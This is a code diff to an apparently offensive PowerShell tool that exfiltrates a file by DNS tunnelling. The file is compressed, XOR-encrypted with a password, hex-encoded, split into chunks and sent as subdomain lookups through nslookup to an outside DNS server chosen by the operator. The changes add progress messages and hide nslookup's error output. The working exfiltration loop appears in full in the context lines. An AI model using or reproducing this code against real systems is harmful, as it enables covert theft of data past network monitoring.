@@ -60,6 +60,7 @@ $gzipStream.Close()
 # Get compressed data as byte array
 $compressedData = $compressedStream.ToArray()
 
+Write-Host "[*] Encrypting file, please wait..."
 # XOR encrypt compressed data with password
 $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)
 $encryptedData = XOR-Encrypt -data $compressedData -password $passwordBytes
@@ -88,6 +89,8 @@ Write-Host "[+] Number of chunks: [$nbChunks]"
 $chunk_id = 0
 $start_index = 0
 
+Write-Host "[*] Sending file, please wait..."
+
 while ($chunk_id -lt $nbChunks) {
     # Get the chunk from the encrypted data string
     $end_index = [Math]::Min($start_index + $bytesLeft, $hexencryptedData.Length)
@@ -113,9 +116,12 @@ while ($chunk_id -lt $nbChunks) {
     $queryType = if ($UseTcp.IsPresent) { "-vc" } else { "" }
     
     # Send DNS query using nslookup
-    nslookup $queryType -type=a $subdomain $DnsServerIp > $null
+    nslookup $queryType -type=a $subdomain $DnsServerIp > $null 2>$null
+
+    Write-Progress -Activity "Sending file in Progress" -Status "$chunk_id/$nbChunks chunks Complete:" -PercentComplete '100'
 
     # Move to next chunk
     $chunk_id++
     $start_index = $end_index
 }
+Write-Host "[+] Transfer complete!"
